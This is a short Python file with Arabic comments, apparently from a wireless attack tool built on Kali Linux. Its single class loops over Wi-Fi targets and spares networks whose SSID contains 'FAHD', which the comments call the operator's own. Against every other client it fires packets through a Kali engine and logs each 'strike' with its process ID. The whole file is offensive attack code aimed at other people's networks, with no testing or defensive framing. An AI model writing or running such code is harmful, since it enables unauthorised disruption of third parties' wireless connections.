#!/usr/bin/env python3

class StrikeSalvoCoupler:
    @staticmethod
    def filter_and_ignite(targets_pool, kali_engine, engine_instance, pkts_count):
        """[ملف تكتيكي منفصل]: الحظر القاطع التلقائي لشبكات فهد وتوليد المعرفات الفردية PIDs حياً لطلبك"""
        strike_idx = 1
        for tgt in targets_pool:
            # الحظر الفيزيائي الصارم للنيران الصديقة
            if "FAHD" in tgt["ssid"].upper():
                engine_instance.protected_logs.append({
                    "mac": tgt["mac"], 
                    "ssid": tgt["ssid"], 
                    "reason": "محجوب تلقائياً (حماية حياض شبكتك)"
                })
            else:
                # توليد القذيفة وإشعال النفق لكالي محلياً واصطياد الـ PID الصافي
                pid = kali_engine.generate_and_fire_packet(tgt["bssid"], tgt["mac"], pkts_count)
                with engine_instance.lock:
                    engine_instance.active_strikes[strike_idx] = {
                        "client": tgt["mac"], 
                        "pid": pid, 
                        "status": "يتم قذفه حياً من كالي 🚀"
                    }
                strike_idx += 1
        return len(engine_instance.active_strikes)
